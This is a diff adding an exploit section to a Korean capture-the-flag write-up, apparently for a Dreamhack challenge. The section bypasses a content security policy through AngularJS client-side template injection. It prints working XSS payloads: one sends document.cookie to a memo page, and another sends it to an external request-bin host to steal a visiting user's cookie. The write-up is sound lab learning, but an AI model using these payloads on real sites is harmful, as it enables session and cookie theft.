@@ -139,3 +139,49 @@ vuln 페이지에서 전달한 템플릿 변수를 기록할 때 HTML 엔티티 
 <br/><br/>
 
 ### 익스플로잇
+* AngularJS Template Injection 사용 가능 여부 확인
+  <br/><br/>
+  <img width="2560" alt="AngularJS Template Injection 취약점 테스트" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/9802ef13-f416-4324-a291-f8c02e10a83f">
+  <br/><br/>
+    - CSP 정책 우회를 위한 Client Side Template Injection을 이용하여 위해 ```script``` 태그의 ```src```를 로드할 때 AngularJS 파일을 이용함
+        + AngularJS Template Injection을 이용한 ```alert(1)``` 스크립트를 실행
+            ```html
+            <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><html ng-app>{{constructor.constructor("alert(1)")()}}</html>
+            ```
+            - AngularJS 파일을 로드한 후 ```<html>``` 또는 ```<body>``` 태그 내에 ```ng-app``` 속성을 추가하여 AngularJS를 사용함을 알림
+
+<br/><br/>
+
+#### 방법 1: memo 페이지 이용
+<img width="2560" alt="익스플로잇 1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/81d6c466-166a-4806-87fb-cefca559a803">
+<br/><br/>
+
+1. flag 페이지에서 아래와 같이 입력하고 제출 버튼을 클릭함
+    ```html
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><html ng-app>{{constructor.constructor("location='memo?memo='+document.cookie")()}}</html>
+    ```
+
+<br/>
+
+2. "good" 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득함
+
+<br/><br/>
+
+#### 방법 2: 외부 웹 서버 이용
+<img width="2560" alt="익스플로잇 2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/7bd497fa-6afd-4063-b29d-7e890b06caf8">
+<br/><br/>
+
+1. 외부에서 접근 가능한 웹 서버를 준지함
+    - Dreamhack에서 제공하는 [드림핵 툴즈 서비스](https://tools.dreamhack.games)의 Request Bin 기능을 이용함
+        + Request Bin 기능에서 랜덤한 URL를 생성한 후 이를 이용하여 익스플로잇을 수행함
+
+<br/>
+
+2. flag 페이지에서 아래와 같이 입력하고 제출 버튼을 클릭함
+    ```html
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><html ng-app>{{constructor.constructor("location='https://RANDOMHOST.request.dreamhack.games/?'+document.cookie")()}}</html>
+    ```
+
+<br/>
+
+3. "good" 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 QueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득함
